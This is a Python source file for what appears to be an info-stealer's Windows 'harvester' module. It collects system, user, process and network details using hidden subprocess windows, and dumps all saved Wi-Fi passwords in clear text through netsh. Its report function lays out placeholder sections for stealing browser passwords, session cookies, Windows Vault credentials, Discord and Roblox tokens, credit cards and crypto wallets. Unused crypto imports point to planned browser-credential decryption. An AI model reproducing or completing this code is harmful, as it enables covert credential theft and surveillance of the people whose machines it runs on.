import os
import platform
import socket
import psutil
import subprocess
import re
import json
import win32crypt
from Crypto.Cipher import AES
import base64
import sqlite3
import shutil

# A placeholder for functions that are highly complex or not yet implemented
def placeholder(feature_name):
    """Returns a placeholder message for an unimplemented feature."""
    return f"[!] Harvester for '{feature_name}' is not yet implemented."

def get_system_info():
    """Gathers basic operating system, user, and hostname information."""
    uname = platform.uname()
    return (
        f"OS Version: {uname.system} {uname.release} ({platform.version()})\n"
        f"OS Build: {platform.win32_ver()[1]}\n"
        f"System Architecture: {uname.machine}\n"
        f"Hostname: {socket.gethostname()}\n"
        f"Current User: {os.getlogin()}\n"
        f"All Users: {', '.join([user.name for user in psutil.users()])}"
    )

def get_hardware_info():
    """Gathers CPU and RAM information."""
    return (
        f"CPU: {platform.processor()}\n"
        f"Cores: {psutil.cpu_count(logical=True)}\n"
        f"Total RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB"
    )

def get_installed_apps():
    """Retrieves a list of installed applications using WMIC."""
    try:
        data = subprocess.check_output(['wmic', 'product', 'get', 'name'], startupinfo=subprocess.STARTUPINFO(wShowWindow=subprocess.SW_HIDE)).decode('utf-8').split('\n')
        app_list = sorted([line.strip() for line in data if line.strip()])
        return "Installed Applications:\n" + "\n".join(app_list[1:])  # Skip header
    except Exception as e:
        return f"Could not retrieve installed applications: {e}"

def get_running_processes():
    """Retrieves a list of currently running processes."""
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return "Running Processes:\n" + "\n".join(processes)

def get_network_info():
    """
    Gathers network information without using the netifaces library.
    """
    # Get public IP using an external service
    try:
        public_ip = subprocess.check_output(['curl', '-s', 'ifconfig.me'], startupinfo=subprocess.STARTUPINFO(wShowWindow=subprocess.SW_HIDE)).decode('utf-8').strip()
    except Exception:
        public_ip = "N/A"

    # Get hostname and private IPv4
    try:
        hostname = socket.gethostname()
        private_ipv4 = socket.gethostbyname(hostname)
    except Exception:
        private_ipv4 = "N/A"

    # Get MAC address by parsing the 'getmac' command
    try:
        mac_data = subprocess.check_output(['getmac'], startupinfo=subprocess.STARTUPINFO(wShowWindow=subprocess.SW_HIDE)).decode('utf-8', errors='ignore')
        mac_address = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", mac_data).group(0)
    except Exception:
        mac_address = "N/A"

    # Getting a reliable private IPv6 without netifaces is complex and often not needed.
    private_ipv6 = "N/A (Implementation requires netifaces or more complex WMI queries)"

    return (
        f"MAC Address: {mac_address}\n"
        f"Private IPv4: {private_ipv4}\n"
        f"Private IPv6: {private_ipv6}\n"
        f"Public IP Address: {public_ip}"
    )

def get_wifi_passwords():
    """Retrieves saved Wi-Fi passwords using the netsh command."""
    try:
        profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], startupinfo=subprocess.STARTUPINFO(wShowWindow=subprocess.SW_HIDE)).decode('utf-8', errors='ignore').split('\n')
        profiles = [line.split(':')[1].strip() for line in profiles_data if "All User Profile" in line]
        
        passwords = []
        for profile in profiles:
            try:
                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], startupinfo=subprocess.STARTUPINFO(wShowWindow=subprocess.SW_HIDE)).decode('utf-8', errors='ignore').split('\n')
                password = [line.split(':')[1].strip() for line in profile_info if "Key Content" in line]
                passwords.append(f"{profile}: {password[0] if password else 'N/A'}")
            except Exception:
                pass # Ignore profiles that fail to parse
        return "Wi-Fi Passwords:\n" + "\n".join(passwords)
    except Exception:
        return "Could not retrieve Wi-Fi passwords (netsh command may have failed)."

def harvest_all_data():
    """Calls all harvester functions and formats them into a single, detailed report string."""
    final_harvest = {
        "System & Hardware": [get_system_info(), get_hardware_info(), get_installed_apps(), get_running_processes()],
        "Network & Connectivity": [get_network_info(), get_wifi_passwords()],
        "User Credentials": [
            placeholder("Browser Passwords"),
            placeholder("Browser Session Cookies"),
            placeholder("Windows Vault Credentials"),
            placeholder("Discord Tokens"),
            placeholder("Roblox Security Cookies")
        ],
        "Financial & Personal Data": [
            placeholder("Saved Credit Card Data"),
            placeholder("Crypto Wallet Files"),
            placeholder("Browser Autofill Data"),
            placeholder("Financial Documents")
        ],
        "Activity & Surveillance": [
            placeholder("Browser History"),
            placeholder("Current Clipboard Contents")
        ]
    }

    report = ""
    for category, items in final_harvest.items():
        report += f"--- {category.upper()} ---\n\n"
        # Join the harvested data sections with double newlines for readability
        report += "\n\n".join(items)
        report += "\n\n"
        
    return report